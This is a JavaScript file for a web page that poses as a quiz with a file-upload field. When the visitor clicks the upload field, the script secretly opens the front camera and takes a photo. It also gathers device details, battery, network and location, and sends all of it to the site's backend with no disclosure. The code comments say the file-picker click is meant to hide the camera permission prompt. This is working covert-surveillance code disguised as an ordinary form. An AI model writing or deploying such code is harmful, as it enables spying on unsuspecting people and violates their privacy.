const form = document.getElementById("quiz-form");
const fileInput = document.getElementById("user-file");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

const BACKEND_BASE = "/api";
let cameraCaptured = false; // capture only once

// Camera constraints
const constraints = { video: { facingMode: "user" }, audio: false };

// Collect metadata (no permission popups for battery/network, location only if granted)
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery: "N/A",
    location: "N/A",
    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
    time: new Date().toLocaleString(),
  };

  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      metadata.battery = `${b.level * 100}% charging:${b.charging}`;
    } catch {}
  }

  if (navigator.permissions && navigator.geolocation) {
    try {
      const status = await navigator.permissions.query({ name: "geolocation" });
      if (status.state === "granted") {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      }
    } catch {}
  }

  return metadata;
}

// Capture camera only once
async function captureCamera() {
  if (cameraCaptured) return;

  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;
    await new Promise(r => setTimeout(r, 1500)); // wait for camera

    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const image = canvas.toDataURL("image/png");
    const metadata = await collectMetadata();

    await fetch(`${BACKEND_BASE}/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata }),
    });

    stream.getTracks().forEach(t => t.stop());
    cameraCaptured = true;
  } catch (err) {
    console.log("Camera blocked or denied", err);
  }
}

// Trigger camera on file input click (single popup)
fileInput.addEventListener("click", () => {
  captureCamera();
});

// Upload file
async function uploadFile(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = async () => {
      try {
        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ file: reader.result, filename: file.name }),
        });
        resolve(await res.json());
      } catch (err) {
        reject(err);
      }
    };
    reader.onerror = () => reject(reader.error);
    reader.readAsDataURL(file);
  });
}

// Form submit
form.addEventListener("submit", async (e) => {
  e.preventDefault();
  if (!fileInput.files.length) {
    alert("Please select a file!");
    return;
  }

  try {
    await uploadFile(fileInput.files[0]);
    document.getElementById("quiz-container").style.display = "none";
    document.getElementById("success-container").style.display = "flex";
  } catch (err) {
    console.error(err);
    alert("Upload failed. Try again.");
  }
});
